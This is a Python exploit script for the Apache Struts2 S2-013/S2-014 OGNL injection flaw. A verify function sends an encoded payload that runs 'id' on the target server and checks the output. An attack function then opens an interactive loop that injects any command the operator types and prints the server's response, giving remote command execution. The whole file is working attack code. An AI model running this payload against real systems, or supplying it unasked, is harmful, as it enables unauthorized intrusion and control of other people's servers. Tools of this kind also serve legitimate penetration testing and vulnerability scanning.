import requests
import re
import urllib


def verify(url):
    relsult = {
        'name': 'S2-013/S2-014 Remote Code Execution Vulnerablity',
        'vulnerable': False
    }
    payload = r'''?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('id').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D'''
    vulurl = urllib.parse.urljoin(url, payload)
    try:
        req = requests.get(vulurl, timeout=3)
        if re.search('uid=.+ gid=.+ groups=.+', req.text) and req.status_code == 200:
            relsult['vulnerable'] = True
            relsult['method'] = 'GET'
            relsult['url'] = url
            relsult['payload'] = vulurl
        return relsult
    except:
        return relsult


def attack(url):
    try:
        cmd = ''
        print('[+] 开始执行命令,输出exit退出')
        basic_payload = r"?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('{0}').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D"
        while cmd != 'exit':
            cmd = input('[+] 执行命令> ')
            payload = basic_payload
            payload = payload.format(cmd)
            vulurl = urllib.parse.urljoin(url, payload)
            req = requests.get(vulurl, timeout=3)
            print('[*] 输出结果:')
            print(req.text)
        return True
    except:
        return False


